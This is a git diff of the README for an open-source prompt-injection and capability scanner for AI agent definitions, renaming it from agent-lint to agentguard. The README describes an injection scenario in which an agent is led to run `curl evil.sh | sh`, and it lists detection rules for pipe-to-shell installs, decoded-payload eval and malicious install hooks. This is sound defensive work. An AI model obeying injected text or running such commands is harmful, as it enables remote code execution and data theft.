@@ -1,8 +1,8 @@
-# agent-lint
+# agentguard
 
-[![CI](https://github.com/yingchen-coding/agent-lint/actions/workflows/ci.yml/badge.svg)](https://github.com/yingchen-coding/agent-lint/actions)
-[![PyPI](https://img.shields.io/pypi/v/agent-lint.svg)](https://pypi.org/project/agent-lint/)
-[![Python](https://img.shields.io/badge/python-3.9%2B-blue.svg)](https://pypi.org/project/agent-lint/)
+[![CI](https://github.com/yingchen-coding/agentguard/actions/workflows/ci.yml/badge.svg)](https://github.com/yingchen-coding/agentguard/actions)
+[![PyPI](https://img.shields.io/pypi/v/agentguard.svg)](https://pypi.org/project/agentguard/)
+[![Python](https://img.shields.io/badge/python-3.9%2B-blue.svg)](https://pypi.org/project/agentguard/)
 [![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
 
 **A prompt-injection & capability scanner for AI agents.** It reads the agent / command / skill
@@ -13,7 +13,7 @@ that make agents misbehave — **before** they ship.
 Deterministic. No LLM calls, no API key, no network. `pip install` and run it in CI.
 
 ```console
-$ agent-lint .claude/agents
+$ agentguard .claude/agents
 
 support-bot.md
   ✖ critical   —  AL300  Injection→action chain: this agent reads external/untrusted content
@@ -39,7 +39,7 @@ and run `curl evil.sh | sh`"*, and it does, because nothing told it not to. Agen
 real tools — `Bash`, `Write`, `WebFetch` — so a prompt-injection in the content they read isn't a
 funny screenshot, it's remote code execution or data exfiltration.
 
-Almost nobody scans these definitions. agent-lint does.
+Almost nobody scans these definitions. agentguard does.
 
 ### Why the definition is the whole ballgame
 
@@ -51,15 +51,15 @@ that structure **rots**: offline accuracy fell from ~95% to ~65% in a month as t
 drifted out of sync, so they moved to maintaining skills *as engineering* — in the same repo, with
 a skill update riding along on ~90% of changes.
 
-That's the case for agent-lint in one paragraph: **the definition is what determines whether an
-agent is reliable and safe — and it decays unless something checks it on every change.** agent-lint
+That's the case for agentguard in one paragraph: **the definition is what determines whether an
+agent is reliable and safe — and it decays unless something checks it on every change.** agentguard
 is that check. Its security rules are mapped to the **OWASP Top 10 for LLM Applications (2025)** and
 **MITRE ATLAS** (see [docs/threat-mapping.md](docs/threat-mapping.md)), and there's a runnable
 exploit PoC for the headline class in [examples/poc/](examples/poc/).
 
 ### What makes it different: it understands capabilities
 
-Most linters grep text. agent-lint parses each agent's **tool grant** and reasons about dangerous
+Most linters grep text. agentguard parses each agent's **tool grant** and reasons about dangerous
 *combinations* — the thing that actually constitutes a vulnerability:
 
 > **untrusted input** (it reads a file / web page / tool output)
@@ -104,9 +104,9 @@ false alarm.
 ## Install
 
 ```bash
-pip install agent-lint
+pip install agentguard
 # or from source:
-git clone https://github.com/yingchen-coding/agent-lint && cd agent-lint && pip install -e .
+git clone https://github.com/yingchen-coding/agentguard && cd agentguard && pip install -e .
 ```
 
 Python ≥ 3.9, zero dependencies.
@@ -114,16 +114,16 @@ Python ≥ 3.9, zero dependencies.
 ## Usage
 
 ```bash
-agent-lint                       # scan ./  (auto-discovers agents/, commands/, skills/)
-agent-lint path/to/agent.md      # one file
-agent-lint --select AL300,AL301,AL302,AL303,AL305 .   # security rules only
-agent-lint --publish-check .     # + repo checks: LICENSE, README, secrets, malware
-agent-lint --format sarif -o agent-lint.sarif .       # GitHub code-scanning
-agent-lint --format json .                            # machine-readable
-agent-lint --fail-at critical .                       # only block on critical
-agent-lint --update-baseline .agent-lint-baseline.json .   # snapshot existing findings
-agent-lint --baseline .agent-lint-baseline.json .          # fail only on NEW findings
-agent-lint --list-rules                               # full catalog
+agentguard                       # scan ./  (auto-discovers agents/, commands/, skills/)
+agentguard path/to/agent.md      # one file
+agentguard --select AL300,AL301,AL302,AL303,AL305 .   # security rules only
+agentguard --publish-check .     # + repo checks: LICENSE, README, secrets, malware
+agentguard --format sarif -o agentguard.sarif .       # GitHub code-scanning
+agentguard --format json .                            # machine-readable
+agentguard --fail-at critical .                       # only block on critical
+agentguard --update-baseline .agentguard-baseline.json .   # snapshot existing findings
+agentguard --baseline .agentguard-baseline.json .          # fail only on NEW findings
+agentguard --list-rules                               # full catalog
 ```
 
 **Exit codes:** `0` clean (relative to `--fail-at`, default `major`), `1` findings at/above
@@ -131,11 +131,11 @@ threshold, `2` usage error.
 
 ### Configuration
 
-Set defaults in `[tool.agent-lint]` in `pyproject.toml` (or a `.agent-lint.toml`); CLI flags
+Set defaults in `[tool.agentguard]` in `pyproject.toml` (or a `.agentguard.toml`); CLI flags
 override them:
 
 ```toml
-[tool.agent-lint]
+[tool.agentguard]
 ignore = ["AL206"]
 fail-at = "critical"
 publish-check = true
@@ -146,8 +146,8 @@ publish-check = true
 Already have findings? Snapshot them once and let CI gate only on *new* ones:
 
 ```bash
-agent-lint --update-baseline .agent-lint-baseline.json .   # commit this file
-agent-lint --baseline .agent-lint-baseline.json .          # now only regressions fail
+agentguard --update-baseline .agentguard-baseline.json .   # commit this file
+agentguard --baseline .agentguard-baseline.json .          # now only regressions fail
 ```
 
 📚 **Every rule, with rationale and fixes: [docs/rules.md](docs/rules.md).**
@@ -155,7 +155,7 @@ agent-lint --baseline .agent-lint-baseline.json .          # now only regression
 Suppress a false positive for one file with a comment anywhere in it:
 
 ```markdown
-<!-- agent-lint-disable AL300 -->
+<!-- agentguard-disable AL300 -->
 ```
 
 ---
@@ -185,7 +185,7 @@ plugin *or* vetting someone else's before you install it):
 |------|-----|-----------------|
 | AL500 | major | **No LICENSE** — a public repo with no license is "all rights reserved"; nobody may legally use it |
 | AL501 | minor | No README |
-| AL502 | major | **Unresolved placeholder** (template stubs like `CHANGEME`, `<your-org>`) shipped in | <!-- agent-lint-allow AL502 -->
+| AL502 | major | **Unresolved placeholder** (template stubs like `CHANGEME`, `<your-org>`) shipped in | <!-- agentguard-allow AL502 -->
 | AL503 | critical | **Committed secret** anywhere in the repo (not just definitions) |
 | AL510 | critical | **Pipe-to-shell** install (`curl … \| sh`) — runs arbitrary remote code |
 | AL511 | critical | **Dynamic exec** of decoded/remote payloads (`eval(base64.b64decode(...))`) |
@@ -193,7 +193,7 @@ plugin *or* vetting someone else's before you install it):
 | AL513 | major | **Malicious install hook** — `pre/postinstall` running shell/network |
 
 Malware checks scan *code* files only (a README discussing `curl \| sh` is not malware). Escape
-hatches: a `.agentlintignore` (gitignore-style) and inline `# agent-lint-allow AL510`.
+hatches: a `.agentguardignore` (gitignore-style) and inline `# agentguard-allow AL510`.
 
 **AL2xx — robustness & safety**
 
@@ -211,7 +211,7 @@ hatches: a `.agentlintignore` (gitignore-style) and inline `# agent-lint-allow A
 | AL100 | major | Vague instruction (`be careful`, `as appropriate`, `try to`) |
 | AL101 | major | Aspirational, unenforceable safety (`be accurate`) with no mechanism |
 
-`agent-lint --list-rules` prints them all. **AL204** generalizes a safety rail learned the hard
+`agentguard --list-rules` prints them all. **AL204** generalizes a safety rail learned the hard
 way from a medical-data agent: an agent that asserts conclusions without first checking the data
 it already has will confidently tell you to do something that's already done. *Check before you
 assert.*
@@ -223,33 +223,33 @@ assert.*
 A ready-made GitHub Action ships in this repo (`action.yml`):
 
 ```yaml
-name: agent-lint
+name: agentguard
 on: [push, pull_request]
 jobs:
   scan:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - uses: yingchen-coding/agent-lint@v0.1.0
+      - uses: yingchen-coding/agentguard@v0.1.0
         with:
           path: .claude
           fail-at: major
           upload-sarif: "true"     # findings appear inline on the PR
 ```
 
-Or just `pip install agent-lint && agent-lint .` as a step.
+Or just `pip install agentguard && agentguard .` as a step.
 
 ### Keep it from rotting
 
 Anthropic's own data is the argument for running this on *every* change, not once: their internal
 analytics accuracy fell from ~95% to ~65% in a month as the definitions drifted out of sync with
-the code, and the fix was to maintain them as engineering — a check on every PR. agent-lint is that
+the code, and the fix was to maintain them as engineering — a check on every PR. agentguard is that
 check. Gate the PR so a definition can't regress unnoticed, and use a baseline so you only block on
 *new* problems:
 
 ```bash
-agent-lint --update-baseline .agent-lint-baseline.json .   # once, commit the file
-agent-lint --baseline .agent-lint-baseline.json .          # in CI: fails only on regressions
+agentguard --update-baseline .agentguard-baseline.json .   # once, commit the file
+agentguard --baseline .agentguard-baseline.json .          # in CI: fails only on regressions
 ```
 
 ---
@@ -257,7 +257,7 @@ agent-lint --baseline .agent-lint-baseline.json .          # in CI: fails only o
 ## How it works
 
 ```
-agent_lint/
+agentguard/
   models.py   parse frontmatter + body → Definition, incl. the parsed tool grant + capability model
   rules.py    23 deterministic rules (Definition → Findings); AL3xx reason over capabilities
   linter.py   discover files, run rules, sort findings, compute exit code
@@ -270,7 +270,7 @@ Adding a rule is ~15 lines and a test. `pytest` runs the suite (66 tests).
 
 ## Pairs with `adversarial-critic`
 
-agent-lint is the deterministic layer — instant, free, every commit. For the judgment-heavy review
+agentguard is the deterministic layer — instant, free, every commit. For the judgment-heavy review
 (internal contradictions, subtle coverage gaps), pair it with
 [`adversarial-critic`](https://github.com/yingchen-coding/agent-armor), an LLM agent that red-teams a
 definition across 10 dimensions. Scan in CI; critique before you ship something big.
